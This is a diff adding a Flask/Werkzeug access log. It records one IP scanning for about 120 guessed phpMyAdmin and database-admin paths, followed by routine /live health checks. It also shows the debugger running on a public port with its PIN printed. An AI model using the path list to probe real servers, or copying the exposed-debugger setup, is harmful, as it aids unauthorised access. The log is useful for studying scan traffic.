+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:32] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:32] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:33] "GET /pma2014/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:33] "GET /pma2012/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:33] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:33] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:34] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:34] "GET /pma/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:34] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:34] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:34] "GET /PMA2011/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:35] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:35] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:35] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:35] "GET /PMA2018/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:36] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:36] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:36] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:36] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:36] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:37] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:37] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:37] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:37] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:38] "GET /PMA2019/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:38] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:38] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:38] "GET /phpMyAdmin-5.1.1-english/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:39] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:39] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:39] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:40] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:40] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:40] "GET /pma/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:41] "GET /pma2020/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:41] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:41] "GET /PMA2014/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:41] "GET /admin/web/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:42] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:42] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:42] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:42] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:42] "GET /pma2015/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:43] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:43] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:43] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:43] "GET /pma2012/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:44] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:44] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:44] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:44] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:44] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:45] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:45] "GET /sql/websql/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:45] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:45] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:46] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:46] "GET /phppma/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:46] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:46] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:47] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:47] "GET /admin/web/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:47] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:47] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:47] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:48] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:48] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:48] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:48] "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:49] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:49] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:49] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:49] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:49] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:50] "GET /db/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:50] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:50] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:50] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:51] "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:51] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:51] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:51] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:51] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:52] "GET /db/websql/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:52] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:52] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:52] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:53] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:53] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:53] "GET /PMA2019/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:53] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:53] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:54] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:54] "GET /PMA2016/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:54] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:54] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:55] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:55] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:55] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:55] "GET /PMA2020/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:56] "GET /pma2017/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:56] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:56] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:56] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:56] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:57] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:57] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:57] "GET /mysql/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:57] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:58] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:58] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:58] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:58] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:58] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:59] "GET /administrator/db/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:59] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:59] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:59] "GET /pma2019/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:08:00] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:31.135.102.66 - - [10/Oct/2021 20:03:24] "GET / HTTP/1.1" 404 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:46:28] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:46:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:46:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:46:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:46:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:46:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:46:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:46:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:19] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:47:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:10] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:48:16] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:17] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:41] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:47] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:52] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:48:57] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:49:02] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:49:07] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:49:12] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:49:17] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:49:22] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:49:27] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:49:45] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:49:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:49:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:13] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:18] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:23] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:28] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:33] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:38] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:43] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:48] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:53] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:50:58] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:03] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:13] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:18] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:23] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:28] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:33] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:38] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:43] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:48] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:53] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:51:58] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:03] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:13] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:18] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:23] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:28] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:33] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:38] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:43] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:48] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:53] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:52:58] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:53:03] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:53:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:53:13] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.227.9.225 - - [24/Oct/2021 00:53:18] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:13] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:17] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:23] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:28] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:33] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:37] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:42] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:47] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:52] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:54:58] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:02] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:07] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:12] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:17] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:23] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:27] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:32] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:37] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:42] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:47] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:52] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:55:57] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:56:03] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:13] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:18] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:23] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:28] "GET /live HTTP/1.1" 200 -
